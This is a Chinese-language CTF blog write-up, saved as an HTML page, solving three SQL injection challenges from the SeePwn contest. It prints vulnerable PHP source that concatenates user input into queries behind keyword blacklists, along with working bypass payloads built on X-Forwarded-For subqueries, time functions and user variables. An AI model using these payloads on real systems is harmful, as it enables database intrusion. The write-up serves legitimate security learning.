@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+
+    
+
+    <title>
+      一个有趣的 SQL 注入小系列 | HeartSky&#39;s blog 
+    </title>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    
+      <meta name="author" content="HeartSky">
+    
+    
+
+    <meta name="description" content="昨天和小伙伴们打了一场越南的 SeePwn CTF，题目质量比想象中的高(虽然也是被虐了。感觉这个 SQL 注入的三道题目蛮有趣的，便记录下并给出自己的思考。 Br0kenMySQL1直接给了源码1234567891011121314151617181920212223242526272829303132333435363738394041424344&amp;lt;?phpif($_GET[&apos;debug">
+<meta name="keywords" content="writeup,CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一个有趣的 SQL 注入小系列 | HeartSky&#39;s blog">
+<meta property="og:url" content="http://heartsky.info/2017/07/16/一个有趣的-SQL-注入小系列/index.html">
+<meta property="og:site_name" content="HeartSky&#39;s blog">
+<meta property="og:description" content="昨天和小伙伴们打了一场越南的 SeePwn CTF，题目质量比想象中的高(虽然也是被虐了。感觉这个 SQL 注入的三道题目蛮有趣的，便记录下并给出自己的思考。 Br0kenMySQL1直接给了源码1234567891011121314151617181920212223242526272829303132333435363738394041424344&amp;lt;?phpif($_GET[&apos;debug">
+<meta property="og:updated_time" content="2017-11-15T06:18:36.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="一个有趣的 SQL 注入小系列 | HeartSky&#39;s blog">
+<meta name="twitter:description" content="昨天和小伙伴们打了一场越南的 SeePwn CTF，题目质量比想象中的高(虽然也是被虐了。感觉这个 SQL 注入的三道题目蛮有趣的，便记录下并给出自己的思考。 Br0kenMySQL1直接给了源码1234567891011121314151617181920212223242526272829303132333435363738394041424344&amp;lt;?phpif($_GET[&apos;debug">
+    
+    
+    
+      <link rel="icon" type="image/x-icon" href="/favicon.png">
+    
+    <link rel="stylesheet" href="/css/uno.css">
+    <link rel="stylesheet" href="/css/highlight.css">
+    <link rel="stylesheet" href="/css/archive.css">
+    <link rel="stylesheet" href="/css/china-social-icon.css">
+
+</head>
+<body>
+
+    <span class="mobile btn-mobile-menu">
+        <i class="icon icon-list btn-mobile-menu__icon"></i>
+        <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+    
+
+<header class="panel-cover panel-cover--collapsed">
+
+
+  <div class="panel-main">
+
+  
+    <div class="panel-main__inner panel-inverted">
+    <div class="panel-main__content">
+
+        
+
+        <h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage">HeartSky&#39;s blog</a></h1>
+        <hr class="panel-cover__divider" />
+
+        
+        <p class="panel-cover__description">
+          在渗透之路上渐行渐远
+        </p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary" />
+        
+
+        <div class="navigation-wrapper">
+
+          <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+
+              
+                
+                <li class="navigation__item"><a href="/#blog" title="" class="blog-button">首页</a></li>
+              
+                
+                <li class="navigation__item"><a href="/about" title="" class="">关于</a></li>
+              
+                
+                <li class="navigation__item"><a href="/archive" title="" class="">归档</a></li>
+              
+                
+                <li class="navigation__item"><a href="/friends" title="" class="">友链</a></li>
+              
+
+            </ul>
+          </nav>
+
+          <!-- ----------------------------
+To add a new social icon simply duplicate one of the list items from below
+and change the class in the <i> tag to match the desired social network
+and then add your link to the <a>. Here is a full list of social network
+classes that you can use:
+
+    icon-social-500px
+    icon-social-behance
+    icon-social-delicious
+    icon-social-designer-news
+    icon-social-deviant-art
+    icon-social-digg
+    icon-social-dribbble
+    icon-social-facebook
+    icon-social-flickr
+    icon-social-forrst
+    icon-social-foursquare
+    icon-social-github
+    icon-social-google-plus
+    icon-social-hi5
+    icon-social-instagram
+    icon-social-lastfm
+    icon-social-linkedin
+    icon-social-medium
+    icon-social-myspace
+    icon-social-path
+    icon-social-pinterest
+    icon-social-rdio
+    icon-social-reddit
+    icon-social-skype
+    icon-social-spotify
+    icon-social-stack-overflow
+    icon-social-steam
+    icon-social-stumbleupon
+    icon-social-treehouse
+    icon-social-tumblr
+    icon-social-twitter
+    icon-social-vimeo
+    icon-social-xbox
+    icon-social-yelp
+    icon-social-youtube
+    icon-social-zerply
+    icon-mail
+
+-------------------------------->
+
+<!-- add social info here -->
+
+
+
+        </div>
+
+      </div>
+
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+
+    <div class="content-wrapper">
+        <div class="content-wrapper__inner entry">
+            
+
+<article class="post-container post-container--single">
+
+  <header class="post-header">
+    
+    <h1 class="post-title">一个有趣的 SQL 注入小系列</h1>
+
+    
+
+    <div class="post-meta">
+      <time datetime="2017-07-16" class="post-meta__date date">2017-07-16</time> 
+
+      <span class="post-meta__tags tags">
+
+          
+
+          
+             &#8226; 标签:
+            <font class="tags">
+              <a class="tags-link" href="/tags/CTF/">CTF</a>, <a class="tags-link" href="/tags/writeup/">writeup</a>
+            </font>
+          
+
+      </span>
+    </div>
+    
+    
+
+  </header>
+
+  <section id="post-content" class="article-content post">
+    <p>昨天和小伙伴们打了一场越南的 SeePwn CTF，题目质量比想象中的高(虽然也是被虐了。感觉这个 SQL 注入的三道题目蛮有趣的，便记录下并给出自己的思考。</p>
+<h3 id="Br0kenMySQL1"><a href="#Br0kenMySQL1" class="headerlink" title="Br0kenMySQL1"></a>Br0kenMySQL1</h3><p>直接给了源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'debug'</span>]==<span class="string">'🕵'</span>) <span class="keyword">die</span>(highlight_file(<span class="keyword">__FILE__</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">'config.php'</span>;</span><br><span class="line"></span><br><span class="line">$link = mysqli_connect(<span class="string">'localhost'</span>, MYSQL_USER, MYSQL_PASSWORD);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$link) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Could not connect: '</span> . mysql_error());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!mysqli_select_db($link,MYSQL_USER)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Could not select database: '</span> . mysql_error());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'#sleep|benchmark|floor|rand|count#is'</span>,$id))</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Don\'t hurt me :-('</span>);</span><br><span class="line">$query = mysqli_query($link,<span class="string">"SELECT username FROM users WHERE id = "</span>. $id);</span><br><span class="line">$row = mysqli_fetch_array($query);</span><br><span class="line">$username = $row[<span class="string">'username'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($username === <span class="string">'guest'</span>)&#123;</span><br><span class="line"></span><br><span class="line">    $ip = @$_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]!=<span class="string">""</span> ? $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] : $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'#sleep|benchmark|floor|rand|count#is'</span>,$ip))</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Don\'t hurt me :-('</span>);</span><br><span class="line">    var_dump($ip);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($ip))</span><br><span class="line">        mysqli_query($link,<span class="string">"INSERT INTO logs VALUES('&#123;$ip&#125;')"</span>);</span><br><span class="line"></span><br><span class="line">    $query = mysqli_query($link,<span class="string">"SELECT username FROM users WHERE id = "</span>. $id);</span><br><span class="line">    $row = mysqli_fetch_array($query);</span><br><span class="line">    $username = $row[<span class="string">'username'</span>];</span><br><span class="line">    <span class="keyword">if</span>($username === <span class="string">'admin'</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"What ???????\nLogin as guest&amp;admin at the same time ?\nSeems our code is broken, here is your bounty\n"</span>;</span><br><span class="line">        <span class="keyword">die</span>(FLAG);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Nothing here"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Hello "</span>.$username;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>第一次查询 username 得到的是 guest，第二次查询变成了 admin (id=1 是 admin，id=2 是 guest)。那么这中间多了什么操作呢，一个插入语句以及时间的变化，所以根据这两点就有两个方向的思路。</p>
+<p>第一个思路就够解决这个问题了，根据能否查询到 ip 的记录作为判断条件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=if((select ip from logs where ip=&apos;127.0.0.123&apos; limit 1),1,2)%23</span><br><span class="line">X-Forwarded-For: 127.0.0.123</span><br></pre></td></tr></table></figure></p>
+<h3 id="Br0kenMySQL2"><a href="#Br0kenMySQL2" class="headerlink" title="Br0kenMySQL2"></a>Br0kenMySQL2</h3><p>和上题一样，只不过多了点过滤<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'#sleep|benchmark|floor|rand|count|select|from|\(|\)#is'</span>,$id))</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Don\'t hurt me :-('</span>);</span><br></pre></td></tr></table></figure></p>
+<p>select 和 from 被禁用，第一个思路行不通了。同时，过滤了圆括号，意味着大部分函数不能用了，但不是所有的函数，为什么这么说呢，因为有些特殊的函数是没有圆括号的。同时结合两个 select 语句时间不一样，我们可以采用有关时间的函数，从<a href="https://dev.mysql.com/doc/refman/5.7/en/date-and-time-functions.html" target="_blank" rel="external">官方文档</a>上可以找到这些<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CURRENT_TIME</span><br><span class="line">CURRENT_DATE</span><br><span class="line">CURRENT_TIMESTAMP</span><br><span class="line">LOCALTIMESTAMP</span><br></pre></td></tr></table></figure></p>
+<p>以 CURRENT_TIME 为例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT CURRENT_TIME;</span><br><span class="line">+--------------+</span><br><span class="line">| CURRENT_TIME |</span><br><span class="line">+--------------+</span><br><span class="line">| 20:39:27     |</span><br><span class="line">+--------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT CURRENT_TIME+0;</span><br><span class="line">+----------------+</span><br><span class="line">| CURRENT_TIME+0 |</span><br><span class="line">+----------------+</span><br><span class="line">|         203934 |</span><br><span class="line">+----------------+</span><br></pre></td></tr></table></figure></p>
+<p>所以可以先获得本地当前时间，然后选取一个靠后点的时间，满足第一个 select 语句在这个时间点前，而第二个 select 语句在这个时间点后便可(注意时差问题)，我这里用的是或语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=2||current_time&gt;51630%23</span><br></pre></td></tr></table></figure></p>
+<p>默认是 guest，当满足时间条件时，查询得到的第一条记录是 id=1。然后开着 burp 跑就行了</p>
+<h3 id="Br0kenMySQL3"><a href="#Br0kenMySQL3" class="headerlink" title="Br0kenMySQL3"></a>Br0kenMySQL3</h3><p>更加严格的黑名单<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'#sleep|benchmark|floor|rand|count|select|from|\(|\)|time|date|sec|day#is'</span>,$id))</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Don\'t hurt me :-('</span>);</span><br></pre></td></tr></table></figure></p>
+<p>过滤了日期和时间函数有关的关键字。那么刚开始想的两条路就走不通了，重新思考下，这两点都是系统产生的的变化，换句话说是我们不用做什么就可以产生的变化。如果我们手动产生变化呢？刚开始想到了系统变量，但是它的值不能改变，想到用户自定义变量，如果在第一条语句中定义了一个自定义变量，根据它是否为 NULL 作为判断条件。尴尬的是没想到除了 if 还可以用 case 语句，而且没有圆括号<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=case when @hs is null then @hs:=2 else 1 end%23</span><br></pre></td></tr></table></figure></p>
+<p>好吧，通杀三道题 = =</p>
+<p>但是后来我发现其实不用 case 语句也是可以的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=2||@hs is not null||@hs:=0%23</span><br></pre></td></tr></table></figure></p>
+<h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><p>问题的关键在于两者间有什么不一样的，中间发生了什么变化，其中系统产生了哪些变化，我们手动又可以产生哪些变化，然后到特定的 MySQL 中又怎么来实现</p>
+<p>虽然题目不难，但思路值得学习</p>
+
+  </section>
+
+  
+  
+</article>
+
+
+            <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+<footer class="footer">
+    <span id="busuanzi_container_page_pv">
+      本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+    </span>
+<span id="busuanzi_container_site_uv">
+  本站访客数<span id="busuanzi_value_site_uv"></span>人次
+</span>
+    <span class="footer__copyright">&copy; 2016-2017. | 由<a href="https://hexo.io/">Hexo</a>强力驱动 | 主题<a href="https://github.com/someus/huno">Huno</a> | <a href="https://coding.net/u/HeartSky/p/HeartSky/git/pages">Hosted by Coding Pages</a></span>  
+</footer>
+
+        </div>
+    </div>
+
+    <!-- js files -->
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/main.js"></script>
+    <script src="/js/scale.fix.js"></script>
+    
+
+    
+
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <script type="text/javascript"> 
+        $(document).ready(function(){
+            MathJax.Hub.Config({ 
+                tex2jax: {inlineMath: [['$','$'],['[latex]','[/latex]'], ['\\(','\\)']]} 
+            });
+        });
+    </script>
+
+
+
+    
+
+    <script src="/js/awesome-toc.min.js"></script>
+    <script>
+        $(document).ready(function(){
+            $.awesome_toc({
+                overlay: true,
+                contentId: "post-content",
+            });
+        });
+    </script>
+
+
+    <script src="http://s11.cnzz.com/z_stat.php?id=1259147269&web_id=1259147269" language="JavaScript"></script>
+    
+    <!--kill ie6 -->
+<!--[if IE 6]>
+  <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
+<![endif]-->
+
+</body>
+</html>
